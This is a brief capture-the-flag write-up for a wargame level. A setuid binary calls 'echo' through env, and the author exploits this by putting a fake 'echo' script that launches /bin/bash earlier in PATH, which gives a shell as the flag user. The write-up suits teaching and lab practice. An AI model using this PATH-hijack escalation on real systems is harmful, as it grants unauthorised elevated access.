# Level03 Writeup

## Info

User level03 has a setuid `flag03` 32bit ELF binary `level03` in their home directory.
 
## level03

Executing the file gives us the following output: `Exploit me`. Using the `string` command we can see two strings of intrest,`system` and `/usr/bin/env echo Exploit me`.

`/usr/bin/env echo Exploit me` is what is the commands being run that shows the text `Exploit me` when the binary is run. `system` is most likely the syscall that is causing this to happen.

## The exploit
 
Since `echo` is not hard coded as a path, we can define our own `echo` script and add it's location to the `PATH` environment variable like so `export PATH=/location/of/our/echo:$PATH`, wich will cause the binary to execute our own script instead of the normal one.

`echo`
``` bash
#!/bin/bash
 
/bin/bash
```

## Victory
 
Executing `level03` drops us into a shell for `flag03`, we can confirm this with `whoami`. Running `getflag` gets us the flag.
 

